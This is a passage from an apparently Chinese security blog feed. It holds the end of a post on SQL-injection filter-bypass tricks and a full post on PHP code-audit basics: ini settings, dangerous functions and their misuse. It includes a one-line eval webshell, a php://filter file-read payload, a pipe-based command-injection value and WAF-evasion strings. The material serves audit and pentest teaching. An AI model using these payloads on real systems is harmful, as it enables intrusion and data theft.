<h4 id="B-使用URL编码"><a href="#B-使用URL编码" class="headerlink" title="B 使用URL编码"></a>B 使用URL编码</h4><p>正常编码<br><code>&#39;为%27      /=%2f  %=%25  *==%2a  /**/==%252f%252a*/</code></p>
<h4 id="C-利用嵌套剥离"><a href="#C-利用嵌套剥离" class="headerlink" title="C 利用嵌套剥离"></a>C 利用嵌套剥离</h4><p>有些过滤器会从用户的输入中进行剥离一些敏感的函数，故可以通过函数的嵌套进行绕过一次剥离；</p>
<p><code>selselectect  剥离后为select</code></p>
<h4 id="D-使用空字节"><a href="#D-使用空字节" class="headerlink" title="D 使用空字节"></a>D 使用空字节</h4><p>一些过滤器在处理输入时，若碰到孔子姐就会听之处理，故通常可以利用空字节绕过过滤器。<code>id=1%00 and 1=2</code></p>
<h4 id="E-避开自定义的过滤器"><a href="#E-避开自定义的过滤器" class="headerlink" title="E 避开自定义的过滤器"></a>E 避开自定义的过滤器</h4><p>一些过滤器所过滤的字符串都是事先写入写好的，故只要我们输入的语法和她们过滤的不匹配即可绕过。<code>and 转换为 a+nd a%nd &#39;a&#39;nd %A0and</code></p>
<h4 id="8-命令执行时过滤了空格"><a href="#8-命令执行时过滤了空格" class="headerlink" title="8 命令执行时过滤了空格"></a>8 命令执行时过滤了空格</h4><p>若命令执行时过滤了空格，则可以利用&lt;&gt;来绕过，比如php<code>&lt;&quot;/tmp/code.php&quot;&gt;&quot;/tmp/result.txt&quot;</code>，这条命令里没有空格，会执行code.php里面的代码并且输出重定向到result.txtx里面，还有注意的是，在做命令执行时，很可能命令无法列出所有的文件，可以去php里面找相关的函数来列文件，链接<a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external"></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1 前言&quot;&gt;&lt;/a&gt;1 前言&lt;/h3&gt;&lt;p&gt;SQL注入绕过的技巧要看具体的环境，可以自己搭建测试，最好是在渗透测试的过程中遇到的环境，否则若仅靠自己凭空想，显然是不靠谱的。这篇文章我会总结一些之前遇到的绕过奇淫技巧，随着自己的见识和能力增强，相信自己总结的方法也会增多。&lt;/p&gt;
    
    </summary>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
      <category term="WAF" scheme="http://yoursite.com/tags/WAF/"/>
    
  </entry>
  
  <entry>
    <title>代码审计基础</title>
    <link href="http://yoursite.com/2016/10/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2016/10/22/代码审计基础/</id>
    <published>2016-10-21T17:04:20.000Z</published>
    <updated>2016-10-29T12:59:16.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-审计方法与步骤"><a href="#1-审计方法与步骤" class="headerlink" title="1 审计方法与步骤"></a>1 审计方法与步骤</h2><h4 id="A-审计前的准备"><a href="#A-审计前的准备" class="headerlink" title="A 审计前的准备"></a>A 审计前的准备</h4><p>1 获得源码-安装网站（在本地搭建网站，一边审计一边测试，实时跟踪各种动态变化)</p>
<p>2 把我大局</p>
<ul>
<li>网站结构（浏览源码文件夹，了解程序的大致目录）</li>
<li>入口文件（index.php,admin.php文件一般是整个文件的入口，详细读一下index.php文件可知道程序的架构，运行流程等）</li>
<li>配置文件（一般类似config.php等文件，保存一些数据库相关信息程序的一些信息。先看看数据库编码，如果是gbk则可能存在宽字节注入。如果变量的值是双引号，则可能存在双引号解析代码执行问题）</li>
<li>(重点）过滤功能-通过详读公共函数文件和安全过滤文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤；过滤方式是替换还是正则?有没有GPC？有没有使用addslasher()处理</li>
</ul>
<a id="more"></a>
<p><img src="http://i1.piimg.com/567571/dfffc0b2306e5093.png" alt=""></p>
<h4 id="B-审计方法"><a href="#B-审计方法" class="headerlink" title="B 审计方法"></a>B 审计方法</h4><ul>
<li>通读源码（一般是企业对自身产品的审计，对于小型应用也可读一读）—-方法：把握大局，然后根据入口文件进行各个模块的审计</li>
<li>敏感函数参数回朔法（shell_exec)—利用Seay法师审计系统，然后可以分析判断敏感函数的上下文，追踪参数源头</li>
<li><p>(重要）定向功能分析法–主要根据程序的业务逻辑来审计，首先用浏览器逐个访问浏览，看看这套程序有哪些功能。根据相关功能，大概存在哪些漏洞。</p>
<p>  常见功能漏洞：（包括但不限于）<br>  初始化安装<br>  站点信息泄露<br>  文件上传，管理<br>  登录认证，权限管理<br>  数据库备份恢复<br>  找回密码<br>  验证码<br>总结：</p>
</li>
<li><p>首先，把握大局，不管什么程序，都要把握大局</p>
</li>
<li>其次，根据定向功能针对每一项功能进行审计；</li>
<li>最后，就是明娜函数参数回溯<h2 id="2-常见的INI配置"><a href="#2-常见的INI配置" class="headerlink" title="2 常见的INI配置"></a>2 常见的INI配置</h2><h4 id="A-配置文件"><a href="#A-配置文件" class="headerlink" title="A 配置文件"></a>A 配置文件</h4></li>
<li>php.ini： 在PHP启动时被读取。对于服务器模块版本的PHP，仅在web服务器启动时读取一次</li>
<li>.user.ini文件：自PHP5.3.0起，php支持基于每个目录的.htaccess风格的INI文件</li>
<li><p>还可以在httpd.conf中覆盖php.ini的值，以进行更灵活的配置</p>
<h4 id="B-配置文件语法"><a href="#B-配置文件语法" class="headerlink" title="B 配置文件语法"></a>B 配置文件语法</h4><h4 id="C-变量相关的配置"><a href="#C-变量相关的配置" class="headerlink" title="C 变量相关的配置"></a>C 变量相关的配置</h4><p>php.ini<br>-<br>  变量相关：<br>  启用全局变量    register_globals = off 作用是关闭自动注册的全局变量，在设置为on的时候，php会将$_POST,$_GET,$_COOKIE,$_ENV,$_SESSION数组总的$key-&gt;$value直接注册为变量，比如$_POST[“username”]就会被注册为$username</p>
<p>  虽然方便了调用，但是有三个问题：</p>
<ul>
<li>不知道变量是哪里来的$_POST的还是$_SESSION来的，非常不方便阅读代码</li>
<li>变量之间互相覆盖，引起不必要的麻烦(重点）</li>
<li><p>安全问题，所以要设置为off<br>短标签：<br>short_open_tag = on<br>这个设置决定是否使用PHP代码开始标志的缩写形式（&lt;??&gt;），若禁用，开始标签必须是完整形式（&lt;?php ?&gt;）<br>同时会影响到缩写形式&lt;?=,它和&lt;?echo等价，从php5.4.0起,&lt;?=总是可用的<br>主要在文件上传使用到，若开启我们可以在上传一句话等使用变形</p>
<h4 id="D-安全模式的配置"><a href="#D-安全模式的配置" class="headerlink" title="D 安全模式的配置"></a>D 安全模式的配置</h4><p>safe_mode = off（默认）</p>
<p>能够控制一些php中的函数，比如system(),同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的文件，比如/etc/passwd，但是默认的php.ini是没有打开安全模式的<br>本特性已经在PHP5.3.0起飞起并将PHP5.40起移除</p>
<p>禁用类/函数<br>disable_classes=,disable_functions=,disable_function=opendir,readir,scandir,fopen,unlink<br>禁用某些类，禁用某些函数。接受函数分隔的函数名列表作为参数。只能设置在php.ini中</p>
<h4 id="E-上传文件及目录权限的配置"><a href="#E-上传文件及目录权限的配置" class="headerlink" title="E 上传文件及目录权限的配置"></a>E 上传文件及目录权限的配置</h4><p>设置上传及最大上传文件大小<br>file_uploads = on<br>upload_max_filesze = 8M<br>文件上传的临时目录<br>upload_tmp_dir=<br>上传临时文件保存的目录，需要可写，如果不设置，则采用系统临时目录（/tmp,C:\Windows\temp)<br>用户访问目录限制<br>open_basedir = .:/tmp/    linux下:代表不同目录的分隔；windows下;代表不同目录分割<br>能够避免PHP脚本访问不应该访问的文件，一定程度上限制了phpshell的危害。我们一般可以设置为只能访问网站目录，表示允许访问当前目录（即PHP脚本文件所在目录）和/tmp/目录，有效防止php木马跨站运行</p>
<h4 id="F-错误信息的配置"><a href="#F-错误信息的配置" class="headerlink" title="F 错误信息的配置"></a>F 错误信息的配置</h4><p>错误信息控制：<br>display_error = On<br>站点发布后应关闭此功能，以免暴漏信息，调试的时候为了输出错误信息，故打开<br>设置错误报告级别：<br>error_reporting = E_ALL<br>这个设置的作用是将错误级别设置为最高，可以显示所有的问题，方便查错，也有利于写出高质量的代码。推荐使用E_ALL|E_STRICT,即所有级别。<br>错误日志：<br>error_log=<br>错误日志的位置，必须对web用户可写入，如果不定义则默认写入到web服务器的错误日志中<br>log_errors = on<br>如下所言，建议将错误日志输出到文件，而不知直接输出到前端</p>
<h4 id="G-魔术引号及远程文件的配置"><a href="#G-魔术引号及远程文件的配置" class="headerlink" title="G 魔术引号及远程文件的配置"></a>G 魔术引号及远程文件的配置</h4><p>魔术引号（本特性已自PHP5.3.0起废弃并将自PHP5.4.0起移除<br>magic_quotes_gpc = On<br>gagic_quotes_runtime = Off<br>为GPC（Get/Post/Cookie)操作设置magic_quotes状态，当magic_quotes为on，所有单引号，双引号，反斜杠和NULL(%00)被一个反斜杠自动转义<br>是否允许打开远程文件<br>allow_url_fopen = on<br>是否允许包含远程文件（include/require)<br>allow_url_include = false</p>
<h2 id="3-常见危险函数及特殊函数"><a href="#3-常见危险函数及特殊函数" class="headerlink" title="3 常见危险函数及特殊函数"></a>3 常见危险函数及特殊函数</h2><h4 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h4><p>eval$assert（调试函数，和eval同样有把字符长当做php执行的功能）&amp;preg_replace</p>
</li>
<li>mixed eval(string $code)<br>把字符串$code作为php代码执行<br>很多的webshell都是用的eval执行具体的操作&lt;?php @eval($_POST[“0”]);?&gt;</li>
<li>bool assert(mixed $assertion[string $description])<br>检查一个断言是否为FALSE<br>因为大多数杀软把eval列入黑名单，故用assert来替代eval来执行具体的操作</li>
<li>preg_replace($pattern, $replacement, $string)<br>搜索$string中符合正则规则$pattern的部分，以$replacement替换，返回替换后的内容。<br>/e修正符使preg_replace()将replacement参数当做php代码<h4 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h4>require，include，require_once，include_once<br>包含函数也能读取任意文件内容，这需要用到[支持的协议和封装协议]和[过滤器]<br>例如：利用php流filter读取任意文件<br>include($_GET[“file”]);<br>?file=php://filter/convert.base64.encode/resource=index.php<h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4></li>
</ul>
</li>
<li>exec() -执行一个外部程 *</li>
<li>passthru() - 执行外部程序并显示原始输出 *</li>
<li>proc_open() - 执行一个命令并打开文件指针用于读取以及写入</li>
<li>shell_exec() - 通过 Shell 执行命令，并将执行结果作为字符串返回 *</li>
<li>system() - 允许执行一个外部程序并回显输出，类似于 passthru()。 *</li>
<li>popen() - 通过popen()参数传递一条命令，并对popen()所打开的文件进行执行</li>
</ul>
<p>只要命令的参数可控就能执行系统命令<br>例如：</p>
<pre><code>system($cmd);或者system(&apos;ping -c 3&apos;.$target);
当$cmd可以控就能执行任意命令
当$target可控的话，可以使用管道符等特殊函数截断从而执行任意命令
$target = &apos;a | whoami&apos;:

大体的思路就是，先把握大局-&gt;针对漏洞有目的的搜索危险函数-&gt;定位危险函数所在文件-&gt;回溯危险源-&gt;找到执行的函数-&gt;过滤防护
</code></pre><h4 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h4><ul>
<li>copy -拷贝函数</li>
<li>file_get_contents - 把整个文件读入为一个字符串</li>
<li>file_put_contents -将一个字符串写入文件</li>
<li>file -把整个文件读入一个数组中</li>
<li>fopen - 打开文件或者URL</li>
<li>move_uploaded_file -将上传的文件移动到新的位置</li>
<li>readfile - 输出文件</li>
<li>rename -重命名一个文件或目录</li>
<li>rmdir -删除目录</li>
<li>unlink&amp;delete - 删除文件</li>
</ul>
<p>任意文件读取写入删除往往是上面几个函数收到了控制</p>
<h4 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h4><ul>
<li>string getenv(string $varname)<br>获取一个环境变量</li>
<li>bool putenv(string $setting)<br>添加setting到服务器环境变量，环境变量仅存活与当前请求期间，在请求结束时环境就会自动恢复到初始状态</li>
</ul>
<p>配置相关</p>
<ul>
<li>string ini_get(string $varname)  成功时返回配置选项的值</li>
<li>string ini_set(string $varname,string $newvalue)</li>
<li>string ini_alter(string $varname,string $newvalue)</li>
</ul>
<p>设置指定配置选项的值，这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
<pre><code>&lt;?php
splay_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;);
ini_set(&quot;display_errors&quot;,0);
echo &quot;\r\n&lt;br/&gt;display_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;);
?&gt;
</code></pre><p>数字判断</p>
<ul>
<li>bool is_numeric(mixed $var)<br>如果var是数字和数字字符串则返回TURE，否则返回FALSE，如果仅用is_numeric判断而不用inval转换就有可能插入16进制的字符创到数据库中，进而导致sql的二次注入</li>
</ul>
<p>数组相关</p>
<ul>
<li>bool in_array(mixed $needle,array $haystack[,bool $strict = FALSE])</li>
</ul>
<p>在haystack中搜索needle，若没有设置strict则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换</p>
<pre><code> $a = &apos;1abc&apos;
in_array($a,array(1,2,3)的返回值会是真
</code></pre><p>变量覆盖</p>
<pre><code>- void parse_str(string $str[,arrary &amp;$arr])

若str是URL传递的查询字符串(query string),则将它解析为变量并设置到当前域。

&lt;?php
//parse_str
$str = &quot;first=value&amp;arr[]=foobar&amp;arr[]=baz&quot;;
echo &quot;&lt;pre&gt;&quot;;
parse_str($str,$array);
print_r($array);

var_dump(isset($first));//已经复制到数组中，不在当前域

parse_str($str);
var_dump(isset($first));
echo &quot;\$first = $first&quot;;
echo &quot;r\n&lt;br /&gt;&quot;;
echo &quot;\$arr[0]=$arr[0]&quot;;
echo &quot;r\n&lt;br /&gt;&quot;;
echo &quot;\$arr[1]=$arr[1]&quot;;
?&gt;
&lt;pre&gt;Array
(
    [first] =&gt; value
    [arr] =&gt; Array
        (
            [0] =&gt; foobar
            [1] =&gt; baz
        )

)
bool(false)
bool(true)
$first = valuer
&lt;br /&gt;$arr[0]=foobarr
&lt;br /&gt;$arr[1]=baz[Finished in 0.1s]
</code></pre><p>列目录</p>
<pre><code>glob()函数依照libc glob()函数使用的规则寻找所有与pattern匹配的文件路径；
&lt;?php
//glob
echo &quot;&lt;pre&gt;&quot;;
print_r(glob(&quot;t*.php&quot;));//匹配t开头的
?&gt;
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-审计方法与步骤&quot;&gt;&lt;a href=&quot;#1-审计方法与步骤&quot; class=&quot;headerlink&quot; title=&quot;1 审计方法与步骤&quot;&gt;&lt;/a&gt;1 审计方法与步骤&lt;/h2&gt;&lt;h4 id=&quot;A-审计前的准备&quot;&gt;&lt;a href=&quot;#A-审计前的准备&quot; class=&quot;headerlink&quot; title=&quot;A 审计前的准备&quot;&gt;&lt;/a&gt;A 审计前的准备&lt;/h4&gt;&lt;p&gt;1 获得源码-安装网站（在本地搭建网站，一边审计一边测试，实时跟踪各种动态变化)&lt;/p&gt;
&lt;p&gt;2 把我大局&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网站结构（浏览源码文件夹，了解程序的大致目录）&lt;/li&gt;
&lt;li&gt;入口文件（index.php,admin.php文件一般是整个文件的入口，详细读一下index.php文件可知道程序的架构，运行流程等）&lt;/li&gt;
&lt;li&gt;配置文件（一般类似config.php等文件，保存一些数据库相关信息程序的一些信息。先看看数据库编码，如果是gbk则可能存在宽字节注入。如果变量的值是双引号，则可能存在双引号解析代码执行问题）&lt;/li&gt;
&lt;li&gt;(重点）过滤功能-通过详读公共函数文件和安全过滤文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤；过滤方式是替换还是正则?有没有GPC？有没有使用addslasher()处理&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
